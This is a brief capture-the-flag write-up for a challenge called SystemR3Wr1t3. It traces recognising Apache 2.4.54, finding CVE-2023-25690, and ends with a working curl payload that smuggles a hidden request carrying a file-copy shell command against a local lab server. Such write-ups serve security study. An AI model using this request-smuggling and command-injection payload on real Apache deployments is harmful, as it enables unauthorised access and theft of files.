# How to solve SystemR3Wr1t3
## Tools
1. Burpsuite (or just curl works)

## Steps
1. Visit the target website
2. Follow instructions (for example, by going to /whatsmyid/2)
3. You get back an ID and a request path.
4. Read through `index.php` and notice that there is a hidden request parameter that you can't access as its only available behind the reverse proxy
5. Look for webserver version in Request headers
6. Google Apache 2.4.54 vulnerabilities
7. Find one CVE-2023-25690
8. Look for a POC to learn how to craft the payload. You can't automate this as far as I know as the environment is not a usual environment and requires understanding the infrastructure.
9. Final payload:
```
curl "http://localhost:8123/whatsmyid/out%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0aGET%20/%3fsecret%3dcp%2520%252Fflag.txt%2520%252Ftmp%252Fout.txt"
```
10. Get flag